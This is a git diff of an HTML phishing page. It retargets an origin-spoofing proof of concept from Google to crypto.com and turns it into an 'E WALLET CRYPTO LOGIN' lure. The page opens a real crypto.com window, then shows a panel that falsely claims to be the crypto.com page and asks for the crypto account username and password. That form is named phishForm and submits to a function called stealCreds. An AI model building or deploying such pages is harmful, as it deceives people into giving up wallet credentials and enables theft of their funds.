@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <title>Spoofing Origin PoC</title>
+    <title>Crypto Login Page</title>
     <style>
       body {
         margin: 0;
@@ -48,19 +48,21 @@
   </head>
   <body>
     <div class="box">
-      <h1>Google</h1>
-      <p id="intro">Click the button below to continue.</p>
-      <button id="triggerBtn" onclick="runPoC()">Sign in to Google</button>
+      <h1>E WALLET CRYPTO LOGIN</h1>
+      <p id="intro">CLICK HERE TO REDIRECT crypto.com</p>
+      <button id="triggerBtn" onclick="runPoC()">
+        Sign in to Crypto Login Page
+      </button>
 
       <div class="fake-panel" id="panel">
         <h3>
-          This page is a google.com page, you can see it yourself above, please
-          fill in your username and password below.
+          This page is the crypto.com page, you can see it yourself above,
+          please fill in your crypto account username and password below.
         </h3>
 
         <form id="phishForm" onsubmit="stealCreds(event)">
           <div>
-            <label>Email or Phone:</label><br />
+            <label>Username or Email:</label><br />
             <input
               type="text"
               id="username"
@@ -110,10 +112,9 @@ Password: ${password}
       }
 
       function runPoC() {
-        const w = window.open("https://www.google.com/csi", "_blank");
+        const w = window.open("https://www.crypto.com/csi", "_blank");
         document.getElementById("panel").style.display = "block";
 
-        // REMOVE button dan intro text setelah diklik
         document.getElementById("triggerBtn").style.display = "none";
         document.getElementById("intro").style.display = "none";
       }
